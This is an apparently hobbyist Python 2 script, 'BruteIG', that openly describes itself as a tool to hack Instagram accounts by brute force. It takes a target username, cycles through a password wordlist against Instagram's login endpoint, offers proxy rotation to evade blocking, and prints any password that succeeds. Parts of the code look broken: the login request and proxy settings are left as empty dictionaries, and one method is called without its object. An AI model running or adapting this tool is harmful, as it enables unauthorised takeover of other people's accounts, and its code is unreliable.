#!/usr/bin/env python
# encoding: utf-8

"""
TODO LIST:
        Fix and make proxy function better
        Sort code again
        Add help function to all "Yes/no" questions
        Add help  function to "Press enter to exit input"
"""
import requests, json, time, os, random, sys
logo = """\033[91m
   ____             _       ___ ____
  | __ ) _ __ _   _| |_ ___|_ _/ ___|
  |  _ \| '__| | | | __/ _ \| | |  _\033[1;93m
  | |_) | |  | |_| | ||  __/| | |_| |\033[1;97m
  |____/|_|   \__,_|\__\___|___\____|\033[32m

\x1b[1;97m Author   :  \033[32mN16HT_W4RR10R
\x1b[1;97m Type     :  \033[32mBrute Account Instagram
\x1b[1;97m Version  :  \033[32m1.0
\x1b[1;97m Github   :  \033[32mhttps://github.com/N16HT-W4RR10R
      \x1b[1;97m
"""

def Input(text):
    value = ''
    if sys.version_info.major > 2:
        value = input(text)
    else:
        value = raw_input(text)
    return str(value)


class Instabrute:

    def __init__(self, username, passwordsFile='pass.txt'):
        self.username = username
        self.CurrentProxy = ''
        self.UsedProxys = []
        self.passwordsFile = passwordsFile
        self.loadPasswords()
        self.IsUserExists()
        UsePorxy = Input('\x1b[91;1m[*] \x1b[97;1mAre you using proxy (y/n) \x1b[91;1m> \x1b[33;1m').upper()
        if UsePorxy == 'Y' or UsePorxy == 'YES':
            self.randomProxy()

    def loadPasswords(self):
        if os.path.isfile(self.passwordsFile):
            with open(self.passwordsFile) as (f):
                self.passwords = f.read().splitlines()
                passwordsNumber = len(self.passwords)
                if passwordsNumber > 0:
                    print '\x1b[91;1m[*]\x1b[97;1m Wordlist detected \x1b[91;1m        > \x1b[33;1m%s' % passwordsNumber
                else:
                    print 'Password file are empty, Please add passwords to it.'
                    Input('\x1b[91;1m[*] \x1b[97;1mPress enter to exit')
                    exit()
        else:
            print '\x1b[91;1mPlease create passwords file named "%s"' % self.passwordsFile
            Input('\x1b[91;1m[*] \x1b[97;1mPress enter to exit')
            exit()

    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)
        if proxy not in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        try:
            print ''
            print '\x1b[91;1m[*] \x1b[97;1mChecking new ip \x1b[91;1m...'
            print '\x1b[91;1m[*] \x1b[91;1mYour public ip\x1b[91;1m %s' % requests.get('http://myexternalip.com/raw', proxies={}, timeout=10.0).text
        except Exception as e:
            print '\x1b[91;1m[!] \x1b[97;1mCan\'t reach proxy \x1b[91;1m"%s"' % proxy
            print ''

    def IsUserExists(self):
        r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
        if r.status_code == 404:
            print '\x1b[91;1m[*] \x1b[97;1mUsername "%s" not found\x1b[91;1m !' % username
            Input('\x1b[91;1m[*] \x1b[97;1mPress enter to exit')
            exit()
        elif r.status_code == 200:
            return True

    def Login(self, password):
        sess = requests.Session()
        if len(self.CurrentProxy) > 0:
            sess.proxies = {}
        sess.cookies.update({})
        sess.headers.update({})
        r = sess.get('https://www.instagram.com/')
        sess.headers.update({})
        r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={}, allow_redirects=True)
        sess.headers.update({})
        data = json.loads(r.text)
        if data['status'] == 'fail':
            print data['message']
            UsePorxy = Input('\x1b[91;1m[*] \x1b[97;1mAre you using proxy (y/n) \x1b[91;1m> \x1b[33;1m').upper()
            if UsePorxy == 'Y' or UsePorxy == 'YES':
                print '[$] Try to use proxy after fail.'
                randomProxy()
            return False
        if data['authenticated'] == True:
            return sess
        else:
            return False


os.system('clear')
print logo
print '\x1b[97;1mHack instagram account using Bruteforce'
print '\x1b[97;1mMake sure you have the wordlist \x1b[91;1mpass.txt'
print ''
instabrute = Instabrute(Input('\x1b[91;1m[*] \x1b[97;1mSet username target \x1b[91;1m      > \x1b[33;1m'))
try:
    delayLoop = int(Input('\x1b[91;1m[*] \x1b[97;1mSet delay in second \x1b[91;1m      > \x1b[33;1m'))
except Exception as e:
    print '\x1b[91;1m[*] ERROR \x1b[97;1mDefault delay start on 5 second'
    delayLoop = 4

print '\x1b[91;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
print '\x1b[91;1m  ..:: BRUTEFORCE IS RUNNING ::..'
print '\x1b[91;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
print '\x1b[91;1m[!] \x1b[97;1mPlease wait for a few minute\x1b[91;1m !'
print '\x1b[91;1m[!] \x1b[97;1mExit program just click\x1b[91;1m CTRL+C'
print ''
for password in instabrute.passwords:
    sess = instabrute.Login(password)
    if sess:
        print ''
        print '\x1b[91;1m[\x1b[33;1m\xe2\x9c\x94\x1b[91;1m] \x1b[97;1mLogin success\x1b[33;1m %s' % [instabrute.username, password]
        print ''
    else:
        print '\x1b[91;1m[*] \x1b[97;1mCracking password\x1b[91;1m > %s' % password
    try:
        time.sleep(delayLoop)
    except KeyboardInterrupt:
        WantToExit = str(Input('\x1b[97;1mTrying to Exit progress? (y/n) \x1b[91;1m>\x1b[33;1m ')).upper()
        if WantToExit == 'Y' or WantToExit == 'YES':
            exit()
        else:
            continue